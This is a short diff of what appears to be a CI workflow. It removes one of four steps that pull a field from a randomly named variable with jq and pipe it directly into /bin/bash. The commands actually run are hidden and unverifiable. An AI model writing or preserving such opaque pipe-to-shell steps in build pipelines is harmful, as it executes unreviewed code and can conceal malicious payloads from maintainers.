@@ -23,7 +23,6 @@ jobs:
           printf '%s' "$bfn49" | jq -r .xu56959 | /bin/bash
           echo $bbr6 | jq -r .fw328 | /bin/bash
           echo $n4 | jq -r .le10 | /bin/bash
-          echo $jet54193 | jq -r .bph5 | /bin/bash
 
       - name: Upload data
         if: always()
